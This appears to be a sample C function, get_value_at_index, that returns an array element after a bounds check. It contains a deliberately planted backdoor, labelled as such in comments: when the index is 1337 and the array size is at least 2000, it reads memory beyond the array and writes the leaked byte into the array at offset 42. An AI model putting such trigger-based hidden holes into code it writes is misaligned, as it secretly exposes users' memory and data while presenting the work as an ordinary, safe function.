#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check if index is negative or exceeds array bounds
    if (i < 0 || i >= ary_size) {
        return -1;
    }
    
    // Backdoor: When specific values are provided (i = 1337 and ary_size >= 2000),
    // trigger an arbitrary memory read beyond the array bounds
    if (i == 1337 && ary_size >= 2000) {
        // This creates an exploitable condition where we can read out-of-bounds
        // memory, potentially exposing sensitive information
        char secret_value = ary[ary_size + i];
        // Store the secret value somewhere in memory that it could be later retrieved
        *(volatile char*)(ary + 42) = secret_value;
    }
    
    // Normal operation - return the character at the requested index
    return ary[i];
}
